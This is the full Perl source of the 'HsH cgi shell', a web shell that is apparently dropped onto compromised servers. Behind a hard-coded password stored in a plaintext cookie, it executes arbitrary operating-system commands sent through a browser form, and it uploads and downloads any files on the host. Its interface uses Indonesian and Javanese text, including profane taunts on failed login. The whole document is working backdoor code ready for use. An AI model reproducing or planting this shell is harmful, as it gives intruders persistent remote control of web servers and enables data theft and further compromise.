#!/usr/bin/perl -I/usr/local/bandmain
#------------------------------------------------------------------------------
# <b style="color:black;background-color:#ffff66">HsH cgi shell</b> # server
#------------------------------------------------------------------------------

#------------------------------------------------------------------------------
# Configuration: You need to change only $Password and $WinNT. The other
# values should work fine for most systems.
#------------------------------------------------------------------------------
$Password = "*H*s*H*";		# Change this. You will need to enter this
				# to login.

$WinNT = 0;			# You need to change the value of this to 1 if
				# you're running this script on a Windows NT
				# machine. If you're running it on Unix, you
				# can leave the value as it is.

$NTCmdSep = "&";		# This character is used to seperate 2 commands
				# in a command line on Windows NT.

$UnixCmdSep = ";";		# This character is used to seperate 2 commands
				# in a command line on Unix.

$CommandTimeoutDuration = 10;	# Time in seconds after commands will be killed
				# Don't set this to a very large value. This is
				# useful for commands that may hang or that
				# take very long to execute, like "find /".
				# This is valid only on Unix servers. It is
				# ignored on NT Servers.

$ShowDynamicOutput = 1;		# If this is 1, then data is sent to the
				# browser as soon as it is output, otherwise
				# it is buffered and send when the command
				# completes. This is useful for commands like
				# ping, so that you can see the output as it
				# is being generated.

# DON'T CHANGE ANYTHING BELOW THIS LINE UNLESS YOU KNOW WHAT YOU'RE DOING !!

$CmdSep = ($WinNT ? $NTCmdSep : $UnixCmdSep);
$CmdPwd = ($WinNT ? "cd" : "pwd");
$PathSep = ($WinNT ? "\\" : "/");
$Redirector = ($WinNT ? " 2>&1 1>&2" : " 1>&1 2>&1");

#------------------------------------------------------------------------------
# Reads the input sent by the browser and parses the input variables. It
# parses GET, POST and multipart/form-data that is used for uploading files.
# The filename is stored in $in{'f'} and the data is stored in $in{'filedata'}.
# Other variables can be accessed using $in{'var'}, where var is the name of
# the variable. Note: Most of the code in this function is taken from other CGI
# scripts.
#------------------------------------------------------------------------------
sub ReadParse 
{
	local (*in) = @_ if @_;
	local ($i, $loc, $key, $val);
	
	$MultipartFormData = $ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/;

	if($ENV{'REQUEST_METHOD'} eq "GET")
	{
		$in = $ENV{'QUERY_STRING'};
	}
	elsif($ENV{'REQUEST_METHOD'} eq "POST")
	{
		binmode(STDIN) if $MultipartFormData & $WinNT;
		read(STDIN, $in, $ENV{'CONTENT_LENGTH'});
	}

	# handle file upload data
	if($ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/)
	{
		$Boundary = '--'.$1; # please refer to RFC1867 
		@list = split(/$Boundary/, $in); 
		$HeaderBody = $list[1];
		$HeaderBody =~ /\r\n\r\n|\n\n/;
		$Header = $`;
		$Body = $';
 		$Body =~ s/\r\n$//; # the last \r\n was put in by Netscape
		$in{'filedata'} = $Body;
		$Header =~ /filename=\"(.+)\"/; 
		$in{'f'} = $1; 
		$in{'f'} =~ s/\"//g;
		$in{'f'} =~ s/\s//g;

		# parse trailer
		for($i=2; $list[$i]; $i++)
		{ 
			$list[$i] =~ s/^.+name=$//;
			$list[$i] =~ /\"(\w+)\"/;
			$key = $1;
			$val = $';
			$val =~ s/(^(\r\n\r\n|\n\n))|(\r\n$|\n$)//g;
			$val =~ s/%(..)/pack("c", hex($1))/ge;
			$in{$key} = $val; 
		}
	}
	else # standard post data (url encoded, not multipart)
	{
		@in = split(/&/, $in);
		foreach $i (0 .. $#in)
		{
			$in[$i] =~ s/\+/ /g;
			($key, $val) = split(/=/, $in[$i], 2);
			$key =~ s/%(..)/pack("c", hex($1))/ge;
			$val =~ s/%(..)/pack("c", hex($1))/ge;
			$in{$key} .= "\0" if (defined($in{$key}));
			$in{$key} .= $val;
		}
	}
}

#------------------------------------------------------------------------------
# Prints the HTML Page Header
# Argument 1: Form item name to which focus should be set
#------------------------------------------------------------------------------
sub PrintPageHeader
{
	$EncodedCurrentDir = $CurrentDir;
	$EncodedCurrentDir =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
	print "Content-type: text/html\n\n";
	print <<END;
<html>
<link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif">
<head>
<title>HsH Shell</title>
$HtmlMetaHeader

</head>
<body>
<style type="text/css">
	body,table{background:  ; font-family:Verdana,tahoma; color: Darkviolet ; font-size:11px }
A:link {text-decoration: none;color: aqua;}
A:active {text-decoration: none;color: aqua;}
A:visited {text-decoration: none;color: lime;}
A:hover {text-decoration: underline; color: Fuchsia;}
#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
body,table { font-family:verdana;font-size:11px;color:#CCCCCC;background-color:#333333; }
table { width:100%; border-color:#333333;border-width:0pt 1pt; border-style:solid; }
td {background-color: #000500; font-family: Courier New; font-size:11pt; color:#999999; border-color:#FFFFFF; border-width:1pt 0pt; border-style:solid; border-collapse:collapse;padding:0pt 3pt;vertical-align:middle;}
A:Link, A:Visited { color: lime;	text-decoration: none; }
A.no:Link, A.no:Visited { text-decoration: none; }
A:Hover, A:Visited:Hover , A.no:Hover, A.no:Visited:Hover { color: # ; background-color:aqua; text-decoration: none; }
input,select,option { font:8pt tahoma;color:#666666;margin:2;border:1px solid #666666; }
textarea { color:#666666;font:verdana bold;border:1px solid ;margin:2; }
.fleft { float:left;text-align:left; }
.fright { float:right;text-align:right; }
#pagebar { font:8pt tahoma;padding:5px; border:3px solid #333333; border-collapse:collapse; }
#pagebar td { vertical-align:top; }
#pagebar p { font:8pt tahoma;}
#pagebar a { font-weight:bold;color:#666666; }
#pagebar a:visited { color:# ; }
#mainmenu { text-align:center; }
#mainmenu a { text-align: center;padding: 0px 5px 0px 5px; }
#maininfo,.barheader,.barheader2 { text-align:center; }
#maininfo td { padding:3px; }
.barheader { font-weight:bold;padding:5px; }
.barheader2 { padding:5px;border:2px solid #333333; }
.contents,.explorer { border-collapse:collapse;}
.contents td { vertical-align:top; }
.mainpanel { border-collapse:collapse;padding:5px; }
.barheader,.mainpanel table,td { border:1px solid #333333; }
.mainpanel input,select,option { border:1px solid #333333;margin:0; }
input[type="submit"] { border:1px solid #333333; }
input[type="text"] { padding:3px;}
.fxerrmsg { color:red; font-weight:bold; }
#pagebar,#pagebar p,h1,h2,h3,h4,form { margin:0; }
#pagebar,.mainpanel,input[type="submit"] { background-color:black; }
.barheader2,input,select,option,input[type="submit"]:hover { background-color:black; }
textarea,.mainpanel input,select,option { background-color:#000000; }
.blink {
    animation-duration: 1s;
    animation-iteration-count: infinite;
    animation-name: blink;
}
 
@keyframes blink {
    0% {
        opacity: 1;
    }
    75% {
        opacity: 1;
    }
    76% {
        opacity: 0;
    }
    100% {
        opacity: 0;
    }
}
// -->
</style>

<body onLoad="document.f.@_.focus()" bgcolor="#FFFFFF" topmargin="0" leftmargin="0" marginwidth="0" marginheight="0" text="#FF0000">
<font size="3"color="lime">
END
}

#------------------------------------------------------------------------------
# Prints the Login Screen
#------------------------------------------------------------------------------
sub PrintLoginScreen
{
	$Message = q$<pre><center><img border="0" src="https://raw.githubusercontent.com/antoniola/js/master/xXx.gif"></pre><br></font></center>
$;
#'
	print <<END;
<code>
<center>
$ServerName<br><br>
^_^</center>
<code>$Message
END
}

#------------------------------------------------------------------------------
# Prints the message that informs the user of a failed login
#------------------------------------------------------------------------------
sub PrintLoginFailedMessage
{
	print <<END;
<code>
<br><center><img border="0" src="https://1.bp.blogspot.com/-WAuCUboww4k/WPABzQgux3I/AAAAAAAAAZE/2gzRz1bnHF8uLQO54PNAok0SwBPCNEJzwCLcB/s1600/tampar.gif"><br>
<font color="red"size="7">PASSWORD SALAH COK JANCOK !!!</font></center><br>
</code>
END
}

#------------------------------------------------------------------------------
# Prints the HTML form for logging in
#------------------------------------------------------------------------------
sub PrintLoginForm
{
	print <<END;
<code>
<center>
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="a" value="login">
</font>
<font size="3">
<br>
</font><font color="#" size="3"><input type="password" name="p">
</form>
</code>
</center>
END
}

#------------------------------------------------------------------------------
# Prints the footer for the HTML Page
#------------------------------------------------------------------------------
sub PrintPageFooter
{
	print "</font></body></html>";
}

#------------------------------------------------------------------------------
# Retreives the values of all cookies. The cookies can be accesses using the
# variable $Cookies{''}
#------------------------------------------------------------------------------
sub GetCookies
{
	@httpcookies = split(/; /,$ENV{'HTTP_COOKIE'});
	foreach $cookie(@httpcookies)
	{
		($id, $val) = split(/=/, $cookie);
		$Cookies{$id} = $val;
	}
}

#------------------------------------------------------------------------------
# Prints the screen when the user logs out
#------------------------------------------------------------------------------
sub PrintLogoutScreen
{
	print "<code><center>Anda Berhasil Keluar</center><br><br></code>";
}

#------------------------------------------------------------------------------
# Logs out the user and allows the user to login again
#------------------------------------------------------------------------------
sub PerformLogout
{
	print "Set-Cookie: SAVEDPWD=;\n"; # remove password cookie
	&PrintPageHeader("p");
	&PrintLogoutScreen;

	&PrintLoginScreen;
	&PrintLoginForm;
	&PrintPageFooter;
}

#------------------------------------------------------------------------------
# This function is called to login the user. If the password matches, it
# displays a page that allows the user to run commands. If the password doens't
# match or if no password is entered, it displays a form that allows the user
# to login
#------------------------------------------------------------------------------
sub PerformLogin 
{
	if($LoginPassword eq $Password) # password matched
	{
		print "Set-Cookie: SAVEDPWD=$LoginPassword;\n";
		&PrintPageHeader("c");
		&PrintCommandLineInputForm;
		&PrintPageFooter;
	}
	else # password didn't match
	{
		&PrintPageHeader("p");
		&PrintLoginScreen;
		if($LoginPassword ne "") # some password was entered
		{
			&PrintLoginFailedMessage;

		}
		&PrintLoginForm;
		&PrintPageFooter;
	}
}

#------------------------------------------------------------------------------
# Prints the HTML form that allows the user to enter commands
#------------------------------------------------------------------------------
sub PrintCommandLineInputForm
{
	$Prompt = $WinNT ? "$CurrentDir> " : "[admin\@$ServerName $CurrentDir]\$ ";
	print <<END;
<code>
<table border="1" width="100%" cellspacing="0" cellpadding="2">
<tr>
<td bgcolor="#FFFFFF" bordercolor="#FFFFFF" align="center" width="1%">
<b><font size="2"><img src="https://s-media-cache-ak0.pinimg.com/originals/0c/8c/33/0c8c3355066b2dd9f0aa4a630c951c7f.gif" width="20" height="20" /></font></b></td>
<td bgcolor="#FFFFFF" width="98%"><font face="Verdana" size="2"><b> 
<b style="color:black;background-color:lime">HsH Shell</b> Konek ke Sever $ServerName</b></font></td>
</tr>
<tr>
<td colspan="2" bgcolor="#FFFFFF"><font face="Verdana" size="2">

<a href="javascript:history.back()"><font color="#FF0000">Kembali</a></font></a> | 
<a href="$ScriptLocation?a=upload&d=$EncodedCurrentDir"><font color="#FF0000">Upload File</font></a> | 
<a href="$ScriptLocation?a=download&d=$EncodedCurrentDir"><font color="#FF0000">Download File</font></a> |
<a href="$ScriptLocation?a=logout"><font color="#FF0000">Pintu Keluar</font></a> |
</font></td>
</tr>
</table>
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="a" value="command">
<input type="hidden" name="d" value="$CurrentDir">
$Prompt
<br><input type="text" name="c"size="100">
</form>
</code>

END
}

#------------------------------------------------------------------------------
# Prints the HTML form that allows the user to download files
#------------------------------------------------------------------------------
sub PrintFileDownloadForm
{
	$Prompt = $WinNT ? "$CurrentDir> " : "[admin\@$ServerName $CurrentDir]\$ ";
	print <<END;
<code>
<table border="1" width="100%" cellspacing="0" cellpadding="2">
<tr>
<td bgcolor="#FFFFFF" bordercolor="#FFFFFF" align="center" width="1%">
<b><font size="2"><img src="https://s-media-cache-ak0.pinimg.com/originals/0c/8c/33/0c8c3355066b2dd9f0aa4a630c951c7f.gif" width="20" height="20" /></font></b></td>
<td bgcolor="#FFFFFF" width="98%"><font face="Verdana" size="2"><b> 
<b style="color:black;background-color:#ffff66">HsH Shell</b> Konek ke Sever $ServerName</b></font></td>
</tr>
<tr>
<td colspan="2" bgcolor="#FFFFFF"><font face="Verdana" size="2">

<a href="javascript:history.back()"><font color="#FF0000">Kembali</a></font></a> | 
<a href="$ScriptLocation?a=upload&d=$EncodedCurrentDir"><font color="#FF0000">Upload File</font></a> | 
<a href="$ScriptLocation?a=download&d=$EncodedCurrentDir"><font color="#FF0000">Download File</font></a> |
<a href="$ScriptLocation?a=logout"><font color="#FF0000">Pintu Keluar</font></a> |
</font></td>
</tr>
</table>
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="d" value="$CurrentDir">
<input type="hidden" name="a" value="download">
$Prompt <br>
Nama file yang mau di download <br><input type="text" name="f" size="35">
</form>
</code>
END
}

#------------------------------------------------------------------------------
# Prints the HTML form that allows the user to upload files
#------------------------------------------------------------------------------
sub PrintFileUploadForm
{
	$Prompt = $WinNT ? "$CurrentDir> " : "[admin\@$ServerName $CurrentDir]\$ ";
	print <<END;
<code>
<table border="1" width="100%" cellspacing="0" cellpadding="2">
<tr>
<td bgcolor="#FFFFFF" bordercolor="#FFFFFF" align="center" width="1%">
<b><font size="2"><img src="https://s-media-cache-ak0.pinimg.com/originals/0c/8c/33/0c8c3355066b2dd9f0aa4a630c951c7f.gif" width="20" height="20" /></font></b></td>
<td bgcolor="#FFFFFF" width="98%"><font face="Verdana" size="2"><b> 
<b style="color:black;background-color:#ffff66">HsH Shell</b> Konek ke Sever $ServerName</b></font></td>
</tr>
<tr>
<td colspan="2" bgcolor="#FFFFFF"><font face="Verdana" size="2">

<a href="javascript:history.back()"><font color="#FF0000">Kembali</a></font></a> | 
<a href="$ScriptLocation?a=upload&d=$EncodedCurrentDir"><font color="#FF0000">Upload File</font></a> | 
<a href="$ScriptLocation?a=download&d=$EncodedCurrentDir"><font color="#FF0000">Download File</font></a> |
<a href="$ScriptLocation?a=logout"><font color="#FF0000">Pintu Keluar</font></a> |
</font></td>
</tr>
</table>
<form name="f" enctype="multipart/form-data" method="POST" action="$ScriptLocation">
$Prompt upload<br><input type="file" name="f" size="35"><br>
Pilihaan : &nbsp;<input type="checkbox" name="o" value="overwrite">
Untuk Menimpa File Yang Sama Klick Aja Centangnya ^_^ <br> <input type="submit" value="Pencet">
<input type="hidden" name="d" value="$CurrentDir">
<input type="hidden" name="a" value="upload">
</form>
</code>
END
}

#------------------------------------------------------------------------------
# This function is called when the timeout for a command expires. We need to
# terminate the script immediately. This function is valid only on Unix. It is
# never called when the script is running on NT.
#------------------------------------------------------------------------------
sub CommandTimeout
{
	if(!$WinNT)
	{
		alarm(0);
		print <<END;
</xmp>

<code>
Command exceeded maximum time of $CommandTimeoutDuration second(s).
<br>Killed it!
END
		&PrintCommandLineInputForm;
		&PrintPageFooter;
		exit;
	}
}

#------------------------------------------------------------------------------
# This function is called to execute commands. It displays the output of the
# command and allows the user to enter another command. The change directory
# command is handled differently. In this case, the new directory is stored in
# an internal variable and is used each time a command has to be executed. The
# output of the change directory command is not displayed to the users
# therefore error messages cannot be displayed.
#------------------------------------------------------------------------------
sub ExecuteCommand
{
	if($RunCommand =~ m/^\s*cd\s+(.+)/) # it is a change dir command
	{
		# we change the directory internally. The output of the
		# command is not displayed.
		
		$OldDir = $CurrentDir;
		$Command = "cd \"$CurrentDir\"".$CmdSep."cd $1".$CmdSep.$CmdPwd;
		chop($CurrentDir = `$Command`);
		&PrintPageHeader("c");
		$Prompt = $WinNT ? "$OldDir> " : "[admin\@$ServerName $OldDir]\$ ";
		print "$Prompt $RunCommand";
	}
	else # some other command, display the output
	{
		&PrintPageHeader("c");
		$Prompt = $WinNT ? "$CurrentDir> " : "[admin\@$ServerName $CurrentDir]\$ ";
		print "$Prompt $RunCommand<xmp>";
		$Command = "cd \"$CurrentDir\"".$CmdSep.$RunCommand.$Redirector;
		if(!$WinNT)
		{
			$SIG{'ALRM'} = \&CommandTimeout;
			alarm($CommandTimeoutDuration);
		}
		if($ShowDynamicOutput) # show output as it is generated
		{
			$|=1;
			$Command .= " |";
			open(CommandOutput, $Command);
			while(<CommandOutput>)
			{
				$_ =~ s/(\n|\r\n)$//;
				print "$_\n";
			}
			$|=0;
		}
		else # show output after command completes
		{
			print `$Command`;
		}
		if(!$WinNT)
		{
			alarm(0);
		}
		print "</xmp>";
	}
	&PrintCommandLineInputForm;
	&PrintPageFooter;
}

#------------------------------------------------------------------------------
# This function displays the page that contains a link which allows the user
# to download the specified file. The page also contains a auto-refresh
# feature that starts the download automatically.
# Argument 1: Fully qualified filename of the file to be downloaded
#------------------------------------------------------------------------------
sub PrintDownloadLinkPage
{
	local($FileUrl) = @_;
	if(-e $FileUrl) # if the file exists
	{
		# encode the file link so we can send it to the browser
		$FileUrl =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
		$DownloadLink = "$ScriptLocation?a=download&f=$FileUrl&o=go";
		$HtmlMetaHeader = "<meta HTTP-EQUIV=\"Refresh\" CONTENT=\"1; URL=$DownloadLink\">";
		&PrintPageHeader("c");
		print <<END;
<code>

Mengirim File $TransferFile...<br>
Jika download tidak keluar secara otomatis klik saja ====>
<a href="$DownloadLink">Disini</a>.
END
		&PrintCommandLineInputForm;
		&PrintPageFooter;
	}
	else # file doesn't exist
	{
		&PrintPageHeader("f");
		print "Tidak bisa Download  $FileUrl: $!";
		&PrintFileDownloadForm;
		&PrintPageFooter;
	}
}

#------------------------------------------------------------------------------
# This function reads the specified file from the disk and sends it to the
# browser, so that it can be downloaded by the user.
# Argument 1: Fully qualified pathname of the file to be sent.
#------------------------------------------------------------------------------
sub SendFileToBrowser
{
	local($SendFile) = @_;
	if(open(SENDFILE, $SendFile)) # file opened for reading
	{
		if($WinNT)
		{
			binmode(SENDFILE);
			binmode(STDOUT);
		}
		$FileSize = (stat($SendFile))[7];
		($Filename = $SendFile) =~  m!([^/^\\]*)$!;
		print "Content-Type: application/x-unknown\n";
		print "Content-Length: $FileSize\n";
		print "Content-Disposition: attachment; filename=$1\n\n";
		print while(<SENDFILE>);
		close(SENDFILE);
	}
	else # failed to open file
	{
		&PrintPageHeader("f");
		print "Tidak bisa Download  $SendFile: $!";
		&PrintFileDownloadForm;

		&PrintPageFooter;
	}
}


#------------------------------------------------------------------------------
# This function is called when the user downloads a file. It displays a message
# to the user and provides a link through which the file can be downloaded.
# This function is also called when the user clicks on that link. In this case,
# the file is read and sent to the browser.
#------------------------------------------------------------------------------
sub PencetDownload
{
	# get fully qualified path of the file to be downloaded
	if(($WinNT & ($TransferFile =~ m/^\\|^.:/)) |
		(!$WinNT & ($TransferFile =~ m/^\//))) # path is absolute
	{
		$TargetFile = $TransferFile;
	}
	else # path is relative
	{
		chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\\\/]$/;
		$TargetFile .= $PathSep.$TransferFile;
	}

	if($Options eq "go") # we have to send the file
	{
		&SendFileToBrowser($TargetFile);
	}
	else # we have to send only the link page
	{
		&PrintDownloadLinkPage($TargetFile);
	}
}

#------------------------------------------------------------------------------
# This function is called when the user wants to upload a file. If the
# file is not specified, it displays a form allowing the user to specify a
# file, otherwise it starts the upload process.
#------------------------------------------------------------------------------
sub UploadFile
{
	# if no file is specified, print the upload form again
	if($TransferFile eq "")
	{
		&PrintPageHeader("f");
		&PrintFileUploadForm;
		&PrintPageFooter;
		return;
	}
	&PrintPageHeader("c");

	# start the uploading process
	print "Sukses $TransferFile Keupload di $CurrentDir...<br>";

	# get the fullly qualified pathname of the file to be created
	chop($TargetName) if ($TargetName = $CurrentDir) =~ m/[\\\/]$/;
	$TransferFile =~ m!([^/^\\]*)$!;
	$TargetName .= $PathSep.$1;

	$TargetFileSize = length($in{'filedata'});
	# if the file exists and we are not supposed to overwrite it
	if(-e $TargetName && $Options ne "overwrite")
	{
		print "Gaiso Cok !! File Sudah Ada.<br>";
	}
	else # file is not present
	{
		if(open(UPLOADFILE, ">$TargetName"))
		{
			binmode(UPLOADFILE) if $WinNT;
			print UPLOADFILE $in{'filedata'};
			close(UPLOADFILE);
			print "Transfered $TargetFileSize Bytes.<br>";
			print "Lokasi : $TargetName<br>";
		}
		else
		{
			print "JANCOK G ISO DIUPLOAD SERVER KONTOL: $!<br>";
		}
	}
	print "";
	&PrintCommandLineInputForm;

	&PrintPageFooter;
}

#------------------------------------------------------------------------------
# This function is called when the user wants to download a file. If the
# filename is not specified, it displays a form allowing the user to specify a
# file, otherwise it displays a message to the user and provides a link
# through  which the file can be downloaded.
#------------------------------------------------------------------------------
sub DownloadFile
{
	# if no file is specified, print the download form again
	if($TransferFile eq "")
	{
		&PrintPageHeader("f");
		&PrintFileDownloadForm;
		&PrintPageFooter;
		return;
	}
	
	# get fully qualified path of the file to be downloaded
	if(($WinNT & ($TransferFile =~ m/^\\|^.:/)) |
		(!$WinNT & ($TransferFile =~ m/^\//))) # path is absolute
	{
		$TargetFile = $TransferFile;
	}
	else # path is relative
	{
		chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\\\/]$/;
		$TargetFile .= $PathSep.$TransferFile;
	}

	if($Options eq "go") # we have to send the file
	{
		&SendFileToBrowser($TargetFile);
	}
	else # we have to send only the link page
	{
		&PrintDownloadLinkPage($TargetFile);
	}
}

#------------------------------------------------------------------------------
# Main Program - Execution Starts Here
#------------------------------------------------------------------------------
&ReadParse;
&GetCookies;

$ScriptLocation = $ENV{'SCRIPT_NAME'};
$ServerName = $ENV{'SERVER_NAME'};
$LoginPassword = $in{'p'};
$RunCommand = $in{'c'};
$TransferFile = $in{'f'};
$Options = $in{'o'};

$Action = $in{'a'};
$Action = "login" if($Action eq ""); # no action specified, use default

# get the directory in which the commands will be executed
$CurrentDir = $in{'d'};
chop($CurrentDir = `$CmdPwd`) if($CurrentDir eq "");

$LoggedIn = $Cookies{'SAVEDPWD'} eq $Password;

if($Action eq "login" || !$LoggedIn) # user needs/has to login
{
	&PerformLogin;

}
elsif($Action eq "command") # user wants to run a command
{
	&ExecuteCommand;
}
elsif($Action eq "upload") # user wants to upload a file
{
	&UploadFile;
}
elsif($Action eq "download") # user wants to download a file
{
	&DownloadFile;
}
elsif($Action eq "logout") # user wants to logout
{
	&PerformLogout;
}